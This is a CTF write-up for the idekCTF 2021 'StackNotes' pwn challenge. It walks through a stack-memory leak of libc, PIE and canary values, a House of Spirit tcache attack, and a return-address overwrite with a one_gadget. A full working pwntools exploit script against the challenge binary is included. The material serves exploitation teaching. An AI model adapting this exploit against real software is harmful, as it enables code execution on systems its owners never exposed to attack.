---
title: "StackNotes — House of Spirit & Tcache Poisoning"
ctf: "idekCTF 2021"
category: "pwn"
difficulty: "medium"
points: null
date: "2026-05-10"
lat: 20.71
lng: 100.00
summary: "Leveraging uninitialized stack memory to leak PIE and Libc, followed by a House of Spirit attack to gain an arbitrary write over the stack and overwrite the return address."
tags:
  - "heap"
  - "house-of-spirit"
  - "stack-leak"
  - "glibc-2.31"
---

## Recon

The challenge is a note manager that stores note metadata on the stack. The environment uses **Glibc 2.31**, which includes tcache double-free detection but lacks the Safe Linking (XORing) found in later versions.

- **Protections**: Full RELRO, PIE, and Canary are enabled.
- **Vulnerability**: The application fails to initialize or clear stack buffers. By viewing a newly created note, we can leak residual pointers (Libc and PIE) left on the stack.

## Exploit

### 1. Information Leak
By creating notes and immediately calling `view()`, we read residual data from the stack. This allows us to calculate the **Libc base** and **PIE base** offsets.

### 2. House of Spirit
We use a `write` operation to craft a fake chunk header directly on the stack. By providing a valid size (e.g., `0x300`) and ensuring the "next" chunk's metadata is also sane, we trick the program into `free()`-ing a stack address into the tcache bin.

### 3. Stack Overwrite & Canary Leak
Once the stack address is in the tcache, a subsequent allocation returns a pointer to the stack. 
1. We use `view(2)` to leak the **Stack Canary**.
2. We use `write(2)` to overwrite the saved return address on the stack with a **one_gadget**.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./stacknotes_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r

def create(idx,size):
    r.sendlineafter(b"> ",b"c")
    r.sendlineafter(b"stacknote?\n",idx)
    r.sendlineafter(b"stacknote?\n",size)

def write(idx,data):
    r.sendlineafter(b"> ",b"w")
    r.sendlineafter(b"in?\n",idx)
    r.sendlineafter(b"content:\n",data)

def view(idx):
    r.sendlineafter(b"> ",b"v")
    r.sendlineafter(b"view\n",idx)
    r.recvuntil(b"Note:\n")

def delete(idx):
    r.sendlineafter(b"> ",b"d")
    r.sendlineafter(b"delete?\n",idx)

def main():
    global r
    r = conn()

    create(b"0",b"112")
    create(b"1",b"31")
    view(b"0")
    lib = u64(r.recv(0x8)) - 0x1ec6a0
    pie = u64(r.recv(0x8)) - 0x2224
    libc.address = lib

    fakechunks = b"A"*0x18
    fakechunks+= p64(0x300) 
    write(b"1",fakechunks)

    delete(b"0")
    create(b"2",b"752")

    view(b"2")
    r.recv(0x88)
    canary = u64(r.recv(0x8))

    log.success(f"LEAK:\nlibase:{hex(lib)}\npiebase:{hex(pie)}\ncanary: {hex(canary)}\n")

    payload = flat(
        "A"*0x88,
        canary,
        b"B"*8,
        libc.address + 0xe6c81 
    )

    write(b"2",payload)
    r.sendline(b"e")

    r.interactive()

if __name__ == "__main__":
    main()
```
---

